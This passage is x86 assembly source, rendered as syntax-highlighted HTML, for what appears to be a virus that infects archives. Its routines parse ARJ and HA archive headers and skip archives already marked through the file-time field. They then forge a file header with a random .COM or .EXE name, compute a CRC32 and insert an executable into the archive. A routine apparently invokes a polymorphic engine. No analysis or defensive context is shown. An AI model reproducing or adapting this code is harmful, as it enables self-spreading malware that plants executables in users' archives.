        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">ZIP_CUR_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GO_WRITE_FILE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">SET_WRITE_FILE</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FNAME_OFF</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">PATH_SEPARATOR</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ENTRY: ESI=WORK BUFFER,EDI=&amp;NAME BUFFER,ECX=READ LENGTH</span><span class="sc0">
</span><span class="sc1">;EXIT:  ESI=STORED PATH+NAME,ECX=SIZEOF(EDI)</span><span class="sc0">
</span><span class="sc5">TEST_EXEC</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">ZIP_CUR_OFF</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">READ_FILE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">TEST_ERR</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc5">FNAME_OFF</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">FNAME_OFF</span><span class="sc0">
</span><span class="sc5">TEST_EXEC_SPEC</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc5">ZIP_EXEC_FLAG</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">TEST_ERR_STC</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">ECX</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">20202000H</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'moc.'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_EXECUTABLE</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'exe.'</span><span class="sc0">
</span><span class="sc5">TEST_ERR_STC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">STC</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">TEST_ERR</span><span class="sc0">
</span><span class="sc5">IS_EXECUTABLE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">PATH_SEPARATOR</span><span class="sc0">
</span><span class="sc5">STORE_PATH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">ECX</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">LOOPNE</span><span class="sc0">  </span><span class="sc5">STORE_PATH</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_ARC_PATH</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">NO_ARC_PATH</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GEN_NAME</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RANDOM_BYTE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'MOC.'</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_ARC_COM</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc12">'EXE.'</span><span class="sc0">
</span><span class="sc5">IS_ARC_COM</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ZIP_EXEC_FLAG</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">TEST_ERR</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RETN</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CHECK_ARCOUNT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ZIP_FILE_COUNTER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc5">MIN_ARC_FILES</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">ERR_INS</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ZIP_EXEC_FLAG</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">ERR_INS</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SPE_THUNK</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: ESI=&amp;STRING,ECX=STRLEN</span><span class="sc0">
</span><span class="sc1">;EXIT:  EAX=CRC32</span><span class="sc0">
</span><span class="sc5">GET_CRC32</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">EBX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
</span><span class="sc5">NEXT_BYTE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
</span><span class="sc5">NEXT_BIT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">NO_ODD</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">0EDB88320H</span><span class="sc0">
</span><span class="sc5">NO_ODD</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">NEXT_BIT</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">NEXT_BYTE</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
</span><span class="sc5">ERR_INS_POP</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
</span><span class="sc5">ERR_INS</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">INF_ARJ</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">READ_ARJ_FH</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">ARJ_HDR_STRUC</span><span class="sc4">+</span><span class="sc5">MAX_PATH</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP_READ_FILE</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">ARJ_READ_OK</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">ERR_INS</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">ERR_INS</span><span class="sc0">
</span><span class="sc5">ARJ_READ_OK</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_HEADER_ID</span><span class="sc4">],</span><span class="sc5">ARJ_SIGN</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">ERR_INS</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_BAS_HDR_SIZE</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">ARJ_DONE</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_FLAGS</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">;VOLUME_FLAG</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">ERR_INS</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_FILE_TYPE</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">;BINARY/TEXT</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">SKIP_EXE_ARJ</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ZIP_FILE_COUNTER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc5">ESI.ARJ_COMPRESS_METHOD</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;ARJ_STORED</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_INF_ARJ</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_FILE_TIME</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">ERR_INS</span><span class="sc0">
</span><span class="sc5">NO_INF_ARJ</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc5">ESI.ARJ_FNAME</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_FLAGS</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">       </span><span class="sc1">;EXTFILE_FLAG</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">NO_ARJ_EXT</span><span class="sc0">
        </span><span class="sc6">SCASD</span><span class="sc0">
</span><span class="sc5">NO_ARJ_EXT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ARJ_FNAME</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">ERR_INS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">REPNE</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">ERR_INS_POP</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_ARJ_FHEADER.ARJ_FNAME</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc12">'/'</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TEST_EXEC_SPEC</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">SKIP_EXE_ARJ</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_ARJ_FHEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.ARJ_ENTRYNAME_POS</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">ARJ_SIGN</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">ARJ_HDR_STRUC</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">OUR_ARJ_FH_LEN</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1EH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_VER_NUM</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">STOSD</span><span class="sc0">
        </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">10H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_FILE_TIME</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">SKIP_EXE_ARJ</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">ESI.ARJ_BAS_HDR_SIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">NEXT_ARJ_EXT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP_READ_FILE</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_ARJ</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">END_ARJ_EXT</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">NEXT_ARJ_EXT</span><span class="sc0">
</span><span class="sc5">END_ARJ_EXT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_FILE_TYPE</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">JA</span><span class="sc0">  </span><span class="sc5">GO_READ_ARJ_FH</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">ESI.ARJ_COMPRESSED_SIZE</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GO_READ_ARJ_FH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">READ_ARJ_FH</span><span class="sc0">
</span><span class="sc5">ARJ_DONE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHECK_ARCOUNT</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_ARJ</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">OUR_ARJ_FHEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_COMPRESSED_SIZE</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_ORIGINAL_SIZE</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.ARJ_CRC32</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OUR_ARJ_FH_LEN</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_CRC32</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">ECX</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP1_INSERT_FILE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">SET_INSERT</span><span class="sc0">
</span><span class="sc5">EXIT_ARJ</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">INF_HA</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.HA_M_SIGN</span><span class="sc4">],</span><span class="sc5">HA_SIGN</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">EXIT_ARJ</span><span class="sc0">
        </span><span class="sc6">CMPSD</span><span class="sc0">               </span><span class="sc1">;ADD    ESI,SIZE HA_MAIN_HEADER</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;INC    2 PTR [ESI.HA_M_FILE_CNT]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">READ_HA_FH</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">HA_FILE_HEADER</span><span class="sc4">+</span><span class="sc5">MAX_DOS_PATH</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP_READ_FILE</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">HA_READ_OK</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">EXIT_ARJ</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">HA_DONE</span><span class="sc0">
</span><span class="sc5">HA_READ_OK</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.HA_VER_METHOD</span><span class="sc4">],</span><span class="sc2">0FH</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_INF_HA</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.HA_FILE_TIME</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">EXIT_ARJ</span><span class="sc0">
</span><span class="sc5">NO_INF_HA</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc5">ESI.HA_PATH</span><span class="sc4">]</span><span class="sc0">
